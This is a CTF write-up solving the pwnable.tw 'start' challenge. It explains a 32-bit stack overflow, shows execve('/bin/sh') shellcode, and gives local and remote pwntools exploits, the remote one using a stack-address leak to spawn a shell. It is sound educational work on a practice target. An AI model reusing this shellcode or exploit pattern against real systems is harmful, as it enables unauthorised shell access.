## Finding the Overflow
The program allocates a 20 byte buffer on the stack (the buffer holding the prompt string, pointed to by `esp`) and it outputs that buffer as the input prompt. It then calls `read(0, esp, 0x3c)` which reads up to 60 bytes into the same 20 byte buffer that was used to store the input prompt, causing an overflow if the size is exceeded.

## Developing a prototype exploit
Before I proceeded with anything else, I looked at the mitigations of this binary to see what would be possible.

```
File:     /workspace/ctf/pwnable.tw/start/start
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Seeing no NX bit, I thought of shellcode because it would be the easiest option due to the stack being executable, meaning shellcode placed anywhere in the stack can be executed as code, and you can avoid the trouble of building a ROP chain.

#### Disabling ASLR
Since my first approach hardcodes addresses, ASLR has to be disabled, because if it stays enabled the addresses would change every run.

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

#### Shellcode
My initial idea was to store shellcode inside of the 20 byte buffer, add padding if required, and then overwrite the instruction pointer with the starting address of the buffer to jump to the start of the shellcode.

So while attempting that, I got a better while debugging and testing out my shellcode. I realized that I could move it past the buffer, and then overwrite the return address with the new location.

Storing the shellcode past the buffer was an option because the read accepts `0x3c` (60) bytes into a 20-byte buffer. By storing the shellcode past the return address we can get more space.

##### Steps
1. First, I needed shellcode. I didn't use `pwntools` shellcode because it probably would have been too big and I would learn more working  with shellcode directly. What I did was google "shellcode >20 bytes" and that lead me to [Linux/x86 - execve(/bin/sh) Shellcode (20 bytes)](https://www.exploit-db.com/exploits/46809)
2. Looking at that page, the assembly was provided in a comment, I used that because it would be easier to change if anything went wrong. The shellcode assembly in the comment was also in AT&T, so what I did was pasted it into Claude and asked it to convert it into Intel.

```
xor ecx, ecx
xor edx, edx
push 0xb
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp     # The bug was esp, ebx (Invalid operand order)
int 0x80
```

- Claude also noticed a bug in the originial shellcode, it would do `mov esp, ebx` resulting in clobbering the stack pointer instead of loading the string address
- Final size of this is 22 bytes


3. Next, I found the memory location of where our shellcode gets stored by setting a breakpoint on the instruction after the `ret`, stepping through the code, and searching for the shellcode on the stack:

![Shellcode at ESP Screenshot](/assets/images/pwnable.tw-start/shellcode.png)
- You can see the location is `0xffffcb1c`


4. Since I had working shellcode, the stack location of where the shellcode starts, it is time to write the exploit:

```python
#!/usr/bin/env python3
from pwn import *

BINARY = './start'
elf = context.binary = ELF(BINARY, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = '''
source /opt/tools/gdb/pwndbg/gdbinit.py
b *_start+55
continue
'''

def start():
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    return process([BINARY])

io = start()

buf_start = 0xffffcb1c
shellcode = asm("""
    xor ecx, ecx
    xor edx, edx
    push 0xb
    pop eax
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
""")

payload = b"\x90" * 20 + p32(buf_start) + shellcode

io.sendlineafter(b"Let's start the CTF:", payload)
io.interactive()

```

This worked on my machine, but in order to get the flag to solve the challenge, I needed to pwn the remote target

## Final Pwn
The roadblock I had to overcome for my exploit to work on the target was computing the buffer start during runtime, because it would not work if it's hardcoded, because the remote server has a different environment.

First thing that comes to mind is searching for a leak, and here it was:
```
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
```

And on line 1, we have this instruction:
```
0x08048060 <+0>:     push   esp
```

`push esp` leaves a copy of the stack pointer in memory, and by overwriting the return address, we are able to redirect execution back into the program's own `write` system call and at that moment `esp` happens to point at the slot holding that copy instead of the prompt buffer. So the program prints its own stack address back causing a leak.

```
[+] Starting local process './start': pid 17495
0xffffcb50
[*] Stopped process './start' (pid 17495)
```


> If you are having trouble understanding this, you can change the final remote exploit to target the local binary and step through it with a debugger and or modify the script to be more verbose. I also added helpful comments into the final exploit

---

Now since I had everything I needed, it was time to write the final exploit:
```python
#!/usr/bin/env python3

from pwn import *

io = remote('chall.pwnable.tw', 10000)

leak_ret = 0x08048087 # mov ecx, esp
shellcode = asm("""
	xor ecx, ecx
	xor edx, edx
	push 0xb
	pop eax
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
""")

# Leaking the stack part
# We are basically starting the program over from leak_ret code
# The only reason it leaks, is because at the end of the code, it does add esp, 0x14
# So first, it has esp + 0, which is the "Let's start the CTF", and then after that it does esp + 20
# And since we are just jumping back into the write after esp has changed, write outputs that esp + 20 address.
payload = b"A" * 20 + p32(leak_ret)
io.sendafter(b"Let's start the CTF:", payload)

# Parse the output to get the address
leaked_esp = u32(io.recv(4))
log.success("Leaked ESP: " + hex(leaked_esp))

# Send shellcode 20 bytes after ESP. Do not get this confused with the input buffer
shellcode_addr = leaked_esp + 20
payload = b"\x90" * 20 + p32(shellcode_addr) + shellcode

io.send(payload)
io.interactive()
```
